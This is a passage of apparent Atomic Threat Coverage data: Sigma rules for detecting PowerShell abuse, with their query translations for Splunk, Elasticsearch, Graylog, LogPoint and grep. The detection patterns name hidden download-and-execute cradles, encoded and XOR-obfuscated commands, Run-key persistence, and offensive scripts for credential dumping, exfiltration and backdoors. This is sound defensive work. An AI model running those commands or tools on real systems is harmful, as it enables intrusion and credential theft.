HKCU\\\\\\\\software\\\\\\\\microsoft\\\\\\\\windows\\\\\\\\currentversion\\\\\\\\run* *bypass \\\\-noprofile \\\\-windowstyle hidden \\\\(new\\\\-object system.net.webclient\\\\).download* *iex\\\\(New\\\\-Object Net.WebClient\\\\).Download*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Message=\"* -nop -w hidden -c * [Convert]::FromBase64String*\" OR Message=\"* -w hidden -noni -nop -c \\\\\"iex(New-Object*\" OR Message=\"* -w hidden -ep bypass -Enc*\" OR Message=\"*powershell.exe reg add HKCU\\\\\\\\software\\\\\\\\microsoft\\\\\\\\windows\\\\\\\\currentversion\\\\\\\\run*\" OR Message=\"*bypass -noprofile -windowstyle hidden (new-object system.net.webclient).download*\" OR Message=\"*iex(New-Object Net.WebClient).Download*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "Message IN [\"* -nop -w hidden -c * [Convert]::FromBase64String*\", \"* -w hidden -noni -nop -c \\\\\"iex(New-Object*\", \"* -w hidden -ep bypass -Enc*\", \"*powershell.exe reg add HKCU\\\\\\\\software\\\\\\\\microsoft\\\\\\\\windows\\\\\\\\currentversion\\\\\\\\run*\", \"*bypass -noprofile -windowstyle hidden (new-object system.net.webclient).download*\", \"*iex(New-Object Net.WebClient).Download*\"]", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P \\'^(?:.*.* -nop -w hidden -c .* \\\\[Convert\\\\]::FromBase64String.*|.*.* -w hidden -noni -nop -c \"iex\\\\(New-Object.*|.*.* -w hidden -ep bypass -Enc.*|.*.*powershell\\\\.exe reg add HKCU\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run.*|.*.*bypass -noprofile -windowstyle hidden \\\\(new-object system\\\\.net\\\\.webclient\\\\)\\\\.download.*|.*.*iex\\\\(New-Object Net\\\\.WebClient\\\\)\\\\.Download.*)\\'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious PowerShell Keywords\nid: 1f49f2ab-26bc-48b3-96cc-dcffbc93eadf\nstatus: experimental\ndescription: Detects keywords that could indicate the use of some PowerShell exploitation framework\ndate: 2019/02/11\nauthor: Florian Roth, Perez Diego (@darkquassar)\nreferences:\n    - https://posts.specterops.io/entering-a-covenant-net-command-and-control-e11038bcf462\n    - https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1\n    - https://github.com/hlldz/Invoke-Phant0m/blob/master/Invoke-Phant0m.ps1\ntags:\n    - attack.execution\n    - attack.t1086\nlogsource:\n    product: windows\n    service: powershell\n    definition: 'It is recommended to use the new \"Script Block Logging\" of PowerShell v5 https://adsecurity.org/?p=2277. Monitor for EventID 4104'\ndetection:\n    keywords:\n        Message:\n            - \"System.Reflection.Assembly.Load\"\n            - \"[System.Reflection.Assembly]::Load\"\n            - \"[Reflection.Assembly]::Load\"\n            - \"System.Reflection.AssemblyName\"\n            - \"Reflection.Emit.AssemblyBuilderAccess\"\n            - \"Runtime.InteropServices.DllImportAttribute\"\n            - \"SuspendThread\"\n    condition: keywords\nfalsepositives:\n    - Penetration tests\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious PowerShell Keywords\nid: 1f49f2ab-26bc-48b3-96cc-dcffbc93eadf\nstatus: experimental\ndescription: Detects keywords that could indicate the use of some PowerShell exploitation framework\ndate: 2019/02/11\nauthor: Florian Roth, Perez Diego (@darkquassar)\nreferences:\n    - https://posts.specterops.io/entering-a-covenant-net-command-and-control-e11038bcf462\n    - https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1\n    - https://github.com/hlldz/Invoke-Phant0m/blob/master/Invoke-Phant0m.ps1\ntags:\n    - attack.execution\n    - attack.t1086\nlogsource:\n    product: windows\n    service: powershell\n    definition: 'It is recommended to use the new \"Script Block Logging\" of PowerShell v5 https://adsecurity.org/?p=2277. Monitor for EventID 4104'\ndetection:\n    keywords:\n        Message:\n            - \"System.Reflection.Assembly.Load\"\n            - \"[System.Reflection.Assembly]::Load\"\n            - \"[Reflection.Assembly]::Load\"\n            - \"System.Reflection.AssemblyName\"\n            - \"Reflection.Emit.AssemblyBuilderAccess\"\n            - \"Runtime.InteropServices.DllImportAttribute\"\n            - \"SuspendThread\"\n    condition: keywords\nfalsepositives:\n    - Penetration tests\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "Message:(\"System.Reflection.Assembly.Load\" OR \"\\\\[System.Reflection.Assembly\\\\]\\\\:\\\\:Load\" OR \"\\\\[Reflection.Assembly\\\\]\\\\:\\\\:Load\" OR \"System.Reflection.AssemblyName\" OR \"Reflection.Emit.AssemblyBuilderAccess\" OR \"Runtime.InteropServices.DllImportAttribute\" OR \"SuspendThread\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-PowerShell-Keywords <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious PowerShell Keywords\",\\n    \"description\": \"Detects keywords that could indicate the use of some PowerShell exploitation framework\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1086\"\\n    ],\\n    \"query\": \"Message:(\\\\\"System.Reflection.Assembly.Load\\\\\" OR \\\\\"\\\\\\\\[System.Reflection.Assembly\\\\\\\\]\\\\\\\\:\\\\\\\\:Load\\\\\" OR \\\\\"\\\\\\\\[Reflection.Assembly\\\\\\\\]\\\\\\\\:\\\\\\\\:Load\\\\\" OR \\\\\"System.Reflection.AssemblyName\\\\\" OR \\\\\"Reflection.Emit.AssemblyBuilderAccess\\\\\" OR \\\\\"Runtime.InteropServices.DllImportAttribute\\\\\" OR \\\\\"SuspendThread\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"Message:(\\\\\"System.Reflection.Assembly.Load\\\\\" OR \\\\\"\\\\\\\\[System.Reflection.Assembly\\\\\\\\]\\\\\\\\:\\\\\\\\:Load\\\\\" OR \\\\\"\\\\\\\\[Reflection.Assembly\\\\\\\\]\\\\\\\\:\\\\\\\\:Load\\\\\" OR \\\\\"System.Reflection.AssemblyName\\\\\" OR \\\\\"Reflection.Emit.AssemblyBuilderAccess\\\\\" OR \\\\\"Runtime.InteropServices.DllImportAttribute\\\\\" OR \\\\\"SuspendThread\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious PowerShell Keywords\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "Message:(\"System.Reflection.Assembly.Load\" \"\\\\[System.Reflection.Assembly\\\\]\\\\:\\\\:Load\" \"\\\\[Reflection.Assembly\\\\]\\\\:\\\\:Load\" \"System.Reflection.AssemblyName\" \"Reflection.Emit.AssemblyBuilderAccess\" \"Runtime.InteropServices.DllImportAttribute\" \"SuspendThread\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Message=\"System.Reflection.Assembly.Load\" OR Message=\"[System.Reflection.Assembly]::Load\" OR Message=\"[Reflection.Assembly]::Load\" OR Message=\"System.Reflection.AssemblyName\" OR Message=\"Reflection.Emit.AssemblyBuilderAccess\" OR Message=\"Runtime.InteropServices.DllImportAttribute\" OR Message=\"SuspendThread\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "Message IN [\"System.Reflection.Assembly.Load\", \"[System.Reflection.Assembly]::Load\", \"[Reflection.Assembly]::Load\", \"System.Reflection.AssemblyName\", \"Reflection.Emit.AssemblyBuilderAccess\", \"Runtime.InteropServices.DllImportAttribute\", \"SuspendThread\"]", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*System\\\\.Reflection\\\\.Assembly\\\\.Load|.*\\\\[System\\\\.Reflection\\\\.Assembly\\\\]::Load|.*\\\\[Reflection\\\\.Assembly\\\\]::Load|.*System\\\\.Reflection\\\\.AssemblyName|.*Reflection\\\\.Emit\\\\.AssemblyBuilderAccess|.*Runtime\\\\.InteropServices\\\\.DllImportAttribute|.*SuspendThread)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious XOR Encoded PowerShell Command Line\ndescription: Detects suspicious powershell process which includes bxor command, alternatvide obfuscation method to b64 encoded commands.\nstatus: experimental\nauthor: Sami Ruohonen\ndate: 2018/09/05\ntags:\n    - attack.execution\n    - attack.t1086\ndetection:\n    selection:\n        CommandLine:\n            - '* -bxor*'\n    condition: selection\nfalsepositives:\n    - unknown\nlevel: medium\nlogsource:\n    category: process_creation\n    product: windows", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious XOR Encoded PowerShell Command Line\ndescription: Detects suspicious powershell process which includes bxor command, alternatvide obfuscation method to b64 encoded commands.\nstatus: experimental\nauthor: Sami Ruohonen\ndate: 2018/09/05\ntags:\n    - attack.execution\n    - attack.t1086\ndetection:\n    selection:\n        CommandLine:\n            - '* -bxor*'\n    condition: selection\nfalsepositives:\n    - unknown\nlevel: medium\nlogsource:\n    category: process_creation\n    product: windows", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:(*\\\\ \\\\-bxor*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-XOR-Encoded-PowerShell-Command-Line <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious XOR Encoded PowerShell Command Line\",\\n    \"description\": \"Detects suspicious powershell process which includes bxor command, alternatvide obfuscation method to b64 encoded commands.\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1086\"\\n    ],\\n    \"query\": \"CommandLine.keyword:(*\\\\\\\\ \\\\\\\\-bxor*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:(*\\\\\\\\ \\\\\\\\-bxor*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious XOR Encoded PowerShell Command Line\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine:(\"* \\\\-bxor*\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"* -bxor*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "CommandLine IN [\"* -bxor*\"]", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.* -bxor.*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: In-memory PowerShell\nid: 092bc4b9-3d1d-43b4-a6b4-8c8acd83522f\nstatus: experimental\ndescription: Detects loading of essential DLL used by PowerShell, but not by the process powershell.exe. Detects meterpreter's \"load powershell\" extension.\nauthor: Tom Kern, oscd.community\ndate: 2019/11/14\nmodified: 2019/11/30\nreferences:\n    - https://adsecurity.org/?p=2921\n    - https://github.com/p3nt4/PowerShdll\ntags:\n    - attack.t1086\n    - attack.execution\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 7\n        ImageLoaded|endswith:\n            - '\\System.Management.Automation.Dll'\n            - '\\System.Management.Automation.ni.Dll'\n    filter:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\WINDOWS\\System32\\sdiagnhost.exe'\n        User: 'NT AUTHORITY\\SYSTEM'\n    condition: selection and not filter\nfalsepositives:\n    - Used by some .NET binaries, minimal on user workstation.\nlevel: high\nenrichment:\n    - EN_0001_cache_sysmon_event_id_1_info                      # http://bit.ly/314zc6x\n    - EN_0003_enrich_other_sysmon_events_with_event_id_1_data   # http://bit.ly/2ojW7fw", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: In-memory PowerShell\nid: 092bc4b9-3d1d-43b4-a6b4-8c8acd83522f\nstatus: experimental\ndescription: Detects loading of essential DLL used by PowerShell, but not by the process powershell.exe. Detects meterpreter's \"load powershell\" extension.\nauthor: Tom Kern, oscd.community\ndate: 2019/11/14\nmodified: 2019/11/30\nreferences:\n    - https://adsecurity.org/?p=2921\n    - https://github.com/p3nt4/PowerShdll\ntags:\n    - attack.t1086\n    - attack.execution\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 7\n        ImageLoaded|endswith:\n            - '\\System.Management.Automation.Dll'\n            - '\\System.Management.Automation.ni.Dll'\n    filter:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\WINDOWS\\System32\\sdiagnhost.exe'\n        User: 'NT AUTHORITY\\SYSTEM'\n    condition: selection and not filter\nfalsepositives:\n    - Used by some .NET binaries, minimal on user workstation.\nlevel: high\nenrichment:\n    - EN_0001_cache_sysmon_event_id_1_info                      # http://bit.ly/314zc6x\n    - EN_0003_enrich_other_sysmon_events_with_event_id_1_data   # http://bit.ly/2ojW7fw", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"7\" AND ImageLoaded.keyword:(*\\\\\\\\System.Management.Automation.Dll OR *\\\\\\\\System.Management.Automation.ni.Dll)) AND (NOT (Image.keyword:(*\\\\\\\\powershell.exe OR *\\\\\\\\WINDOWS\\\\\\\\System32\\\\\\\\sdiagnhost.exe) AND User:\"NT\\\\ AUTHORITY\\\\\\\\SYSTEM\")))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/In-memory-PowerShell <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"In-memory PowerShell\",\\n    \"description\": \"Detects loading of essential DLL used by PowerShell, but not by the process powershell.exe. Detects meterpreter\\'s \\\\\"load powershell\\\\\" extension.\",\\n    \"tags\": [\\n      \"attack.t1086\",\\n      \"attack.execution\"\\n    ],\\n    \"query\": \"((EventID:\\\\\"7\\\\\" AND ImageLoaded.keyword:(*\\\\\\\\\\\\\\\\System.Management.Automation.Dll OR *\\\\\\\\\\\\\\\\System.Management.Automation.ni.Dll)) AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\powershell.exe OR *\\\\\\\\\\\\\\\\WINDOWS\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\sdiagnhost.exe) AND User:\\\\\"NT\\\\\\\\ AUTHORITY\\\\\\\\\\\\\\\\SYSTEM\\\\\")))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"7\\\\\" AND ImageLoaded.keyword:(*\\\\\\\\\\\\\\\\System.Management.Automation.Dll OR *\\\\\\\\\\\\\\\\System.Management.Automation.ni.Dll)) AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\powershell.exe OR *\\\\\\\\\\\\\\\\WINDOWS\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\sdiagnhost.exe) AND User:\\\\\"NT\\\\\\\\ AUTHORITY\\\\\\\\\\\\\\\\SYSTEM\\\\\")))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'In-memory PowerShell\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"7\" AND ImageLoaded.keyword:(*\\\\\\\\System.Management.Automation.Dll *\\\\\\\\System.Management.Automation.ni.Dll)) AND (NOT (Image.keyword:(*\\\\\\\\powershell.exe *\\\\\\\\WINDOWS\\\\\\\\System32\\\\\\\\sdiagnhost.exe) AND User:\"NT AUTHORITY\\\\\\\\SYSTEM\")))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"7\" (ImageLoaded=\"*\\\\\\\\System.Management.Automation.Dll\" OR ImageLoaded=\"*\\\\\\\\System.Management.Automation.ni.Dll\")) NOT ((Image=\"*\\\\\\\\powershell.exe\" OR Image=\"*\\\\\\\\WINDOWS\\\\\\\\System32\\\\\\\\sdiagnhost.exe\") User=\"NT AUTHORITY\\\\\\\\SYSTEM\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "((event_id=\"7\" ImageLoaded IN [\"*\\\\\\\\System.Management.Automation.Dll\", \"*\\\\\\\\System.Management.Automation.ni.Dll\"])  -(Image IN [\"*\\\\\\\\powershell.exe\", \"*\\\\\\\\WINDOWS\\\\\\\\System32\\\\\\\\sdiagnhost.exe\"] User=\"NT AUTHORITY\\\\\\\\SYSTEM\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*7)(?=.*(?:.*.*\\\\System\\\\.Management\\\\.Automation\\\\.Dll|.*.*\\\\System\\\\.Management\\\\.Automation\\\\.ni\\\\.Dll))))(?=.*(?!.*(?:.*(?=.*(?:.*.*\\\\powershell\\\\.exe|.*.*\\\\WINDOWS\\\\System32\\\\sdiagnhost\\\\.exe))(?=.*NT AUTHORITY\\\\SYSTEM)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Malicious PowerShell Commandlet Names\nid: f331aa1f-8c53-4fc3-b083-cc159bc971cb\nstatus: experimental\ndescription: Detects the creation of known powershell scripts for exploitation\nreferences:\n    - https://raw.githubusercontent.com/Neo23x0/sigma/f35c50049fa896dff91ff545cb199319172701e8/rules/windows/powershell/powershell_malicious_commandlets.yml\ntags:\n    - attack.execution\n    - attack.t1086\nauthor: Markus Neis\ndate: 2018/04/07\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 11\n        TargetFilename:\n            - '*\\Invoke-DllInjection.ps1'   \n            - '*\\Invoke-WmiCommand.ps1'\n            - '*\\Get-GPPPassword.ps1'\n            - '*\\Get-Keystrokes.ps1'\n            - '*\\Get-VaultCredential.ps1'\n            - '*\\Invoke-CredentialInjection.ps1'\n            - '*\\Invoke-Mimikatz.ps1'\n            - '*\\Invoke-NinjaCopy.ps1'\n            - '*\\Invoke-TokenManipulation.ps1'\n            - '*\\Out-Minidump.ps1'\n            - '*\\VolumeShadowCopyTools.ps1'\n            - '*\\Invoke-ReflectivePEInjection.ps1'\n            - '*\\Get-TimedScreenshot.ps1'\n            - '*\\Invoke-UserHunter.ps1'\n            - '*\\Find-GPOLocation.ps1'\n            - '*\\Invoke-ACLScanner.ps1'\n            - '*\\Invoke-DowngradeAccount.ps1'\n            - '*\\Get-ServiceUnquoted.ps1'\n            - '*\\Get-ServiceFilePermission.ps1'\n            - '*\\Get-ServicePermission.ps1'\n            - '*\\Invoke-ServiceAbuse.ps1'\n            - '*\\Install-ServiceBinary.ps1'\n            - '*\\Get-RegAutoLogon.ps1'\n            - '*\\Get-VulnAutoRun.ps1'\n            - '*\\Get-VulnSchTask.ps1'\n            - '*\\Get-UnattendedInstallFile.ps1'\n            - '*\\Get-WebConfig.ps1'\n            - '*\\Get-ApplicationHost.ps1'\n            - '*\\Get-RegAlwaysInstallElevated.ps1'\n            - '*\\Get-Unconstrained.ps1'\n            - '*\\Add-RegBackdoor.ps1'\n            - '*\\Add-ScrnSaveBackdoor.ps1'\n            - '*\\Gupt-Backdoor.ps1'\n            - '*\\Invoke-ADSBackdoor.ps1'\n            - '*\\Enabled-DuplicateToken.ps1'\n            - '*\\Invoke-PsUaCme.ps1'\n            - '*\\Remove-Update.ps1'\n            - '*\\Check-VM.ps1'\n            - '*\\Get-LSASecret.ps1'\n            - '*\\Get-PassHashes.ps1'\n            - '*\\Show-TargetScreen.ps1'\n            - '*\\Port-Scan.ps1'\n            - '*\\Invoke-PoshRatHttp.ps1'\n            - '*\\Invoke-PowerShellTCP.ps1'\n            - '*\\Invoke-PowerShellWMI.ps1'\n            - '*\\Add-Exfiltration.ps1'\n            - '*\\Add-Persistence.ps1'\n            - '*\\Do-Exfiltration.ps1'\n            - '*\\Start-CaptureServer.ps1'\n            - '*\\Invoke-ShellCode.ps1'\n            - '*\\Get-ChromeDump.ps1'\n            - '*\\Get-ClipboardContents.ps1'\n            - '*\\Get-FoxDump.ps1'\n            - '*\\Get-IndexedItem.ps1'\n            - '*\\Get-Screenshot.ps1'\n            - '*\\Invoke-Inveigh.ps1'\n            - '*\\Invoke-NetRipper.ps1'\n            - '*\\Invoke-EgressCheck.ps1'\n            - '*\\Invoke-PostExfil.ps1'\n            - '*\\Invoke-PSInject.ps1'\n            - '*\\Invoke-RunAs.ps1'\n            - '*\\MailRaider.ps1'\n            - '*\\New-HoneyHash.ps1'\n            - '*\\Set-MacAttribute.ps1'\n            - '*\\Invoke-DCSync.ps1'\n            - '*\\Invoke-PowerDump.ps1'\n            - '*\\Exploit-Jboss.ps1'\n            - '*\\Invoke-ThunderStruck.ps1'\n            - '*\\Invoke-VoiceTroll.ps1'\n            - '*\\Set-Wallpaper.ps1'\n            - '*\\Invoke-InveighRelay.ps1'\n            - '*\\Invoke-PsExec.ps1'\n            - '*\\Invoke-SSHCommand.ps1'\n            - '*\\Get-SecurityPackages.ps1'\n            - '*\\Install-SSP.ps1'\n            - '*\\Invoke-BackdoorLNK.ps1'\n            - '*\\PowerBreach.ps1'\n            - '*\\Get-SiteListPassword.ps1'\n            - '*\\Get-System.ps1'\n            - '*\\Invoke-BypassUAC.ps1'\n            - '*\\Invoke-Tater.ps1'\n            - '*\\Invoke-WScriptBypassUAC.ps1'\n            - '*\\PowerUp.ps1'\n            - '*\\PowerView.ps1'\n            - '*\\Get-RickAstley.ps1'\n            - '*\\Find-Fruit.ps1'\n            - '*\\HTTP-Login.ps1'\n            - '*\\Find-TrustedDocuments.ps1'\n            - '*\\Invoke-Paranoia.ps1'\n            - '*\\Invoke-WinEnum.ps1'\n            - '*\\Invoke-ARPScan.ps1'\n            - '*\\Invoke-PortScan.ps1'\n            - '*\\Invoke-ReverseDNSLookup.ps1'\n            - '*\\Invoke-SMBScanner.ps1'\n            - '*\\Invoke-Mimikittenz.ps1'\n    condition: selection\nfalsepositives:\n    - Penetration Tests\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Malicious PowerShell Commandlet Names\nid: f331aa1f-8c53-4fc3-b083-cc159bc971cb\nstatus: experimental\ndescription: Detects the creation of known powershell scripts for exploitation\nreferences:\n    - https://raw.githubusercontent.com/Neo23x0/sigma/f35c50049fa896dff91ff545cb199319172701e8/rules/windows/powershell/powershell_malicious_commandlets.yml\ntags:\n    - attack.execution\n    - attack.t1086\nauthor: Markus Neis\ndate: 2018/04/07\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 11\n        TargetFilename:\n            - '*\\Invoke-DllInjection.ps1'   \n            - '*\\Invoke-WmiCommand.ps1'\n            - '*\\Get-GPPPassword.ps1'\n            - '*\\Get-Keystrokes.ps1'\n            - '*\\Get-VaultCredential.ps1'\n            - '*\\Invoke-CredentialInjection.ps1'\n            - '*\\Invoke-Mimikatz.ps1'\n            - '*\\Invoke-NinjaCopy.ps1'\n            - '*\\Invoke-TokenManipulation.ps1'\n            - '*\\Out-Minidump.ps1'\n            - '*\\VolumeShadowCopyTools.ps1'\n            - '*\\Invoke-ReflectivePEInjection.ps1'\n            - '*\\Get-TimedScreenshot.ps1'\n            - '*\\Invoke-UserHunter.ps1'\n            - '*\\Find-GPOLocation.ps1'\n            - '*\\Invoke-ACLScanner.ps1'\n            - '*\\Invoke-DowngradeAccount.ps1'\n            - '*\\Get-ServiceUnquoted.ps1'\n            - '*\\Get-ServiceFilePermission.ps1'\n            - '*\\Get-ServicePermission.ps1'\n            - '*\\Invoke-ServiceAbuse.ps1'\n            - '*\\Install-ServiceBinary.ps1'\n            - '*\\Get-RegAutoLogon.ps1'\n            - '*\\Get-VulnAutoRun.ps1'\n            - '*\\Get-VulnSchTask.ps1'\n            - '*\\Get-UnattendedInstallFile.ps1'\n            - '*\\Get-WebConfig.ps1'\n            - '*\\Get-ApplicationHost.ps1'\n            - '*\\Get-RegAlwaysInstallElevated.ps1'\n            - '*\\Get-Unconstrained.ps1'\n            - '*\\Add-RegBackdoor.ps1'\n            - '*\\Add-ScrnSaveBackdoor.ps1'\n            - '*\\Gupt-Backdoor.ps1'\n            - '*\\Invoke-ADSBackdoor.ps1'\n            - '*\\Enabled-DuplicateToken.ps1'\n            - '*\\Invoke-PsUaCme.ps1'\n            - '*\\Remove-Update.ps1'\n            - '*\\Check-VM.ps1'\n            - '*\\Get-LSASecret.ps1'\n            - '*\\Get-PassHashes.ps1'\n            - '*\\Show-TargetScreen.ps1'\n            - '*\\Port-Scan.ps1'\n            - '*\\Invoke-PoshRatHttp.ps1'\n            - '*\\Invoke-PowerShellTCP.ps1'\n            - '*\\Invoke-PowerShellWMI.ps1'\n            - '*\\Add-Exfiltration.ps1'\n            - '*\\Add-Persistence.ps1'\n            - '*\\Do-Exfiltration.ps1'\n            - '*\\Start-CaptureServer.ps1'\n            - '*\\Invoke-ShellCode.ps1'\n            - '*\\Get-ChromeDump.ps1'\n            - '*\\Get-ClipboardContents.ps1'\n            - '*\\Get-FoxDump.ps1'\n            - '*\\Get-IndexedItem.ps1'\n            - '*\\Get-Screenshot.ps1'\n            - '*\\Invoke-Inveigh.ps1'\n            - '*\\Invoke-NetRipper.ps1'\n            - '*\\Invoke-EgressCheck.ps1'\n            - '*\\Invoke-PostExfil.ps1'\n            - '*\\Invoke-PSInject.ps1'\n            - '*\\Invoke-RunAs.ps1'\n            - '*\\MailRaider.ps1'\n            - '*\\New-HoneyHash.ps1'\n            - '*\\Set-MacAttribute.ps1'\n            - '*\\Invoke-DCSync.ps1'\n            - '*\\Invoke-PowerDump.ps1'\n            - '*\\Exploit-Jboss.ps1'\n            - '*\\Invoke-ThunderStruck.ps1'\n            - '*\\Invoke-VoiceTroll.ps1'\n            - '*\\Set-Wallpaper.ps1'\n            - '*\\Invoke-InveighRelay.ps1'\n            - '*\\Invoke-PsExec.ps1'\n            - '*\\Invoke-SSHCommand.ps1'\n            - '*\\Get-SecurityPackages.ps1'\n            - '*\\Install-SSP.ps1'\n            - '*\\Invoke-BackdoorLNK.ps1'\n            - '*\\PowerBreach.ps1'\n            - '*\\Get-SiteListPassword.ps1'\n            - '*\\Get-System.ps1'\n            - '*\\Invoke-BypassUAC.ps1'\n            - '*\\Invoke-Tater.ps1'\n            - '*\\Invoke-WScriptBypassUAC.ps1'\n            - '*\\PowerUp.ps1'\n            - '*\\PowerView.ps1'\n            - '*\\Get-RickAstley.ps1'\n            - '*\\Find-Fruit.ps1'\n            - '*\\HTTP-Login.ps1'\n            - 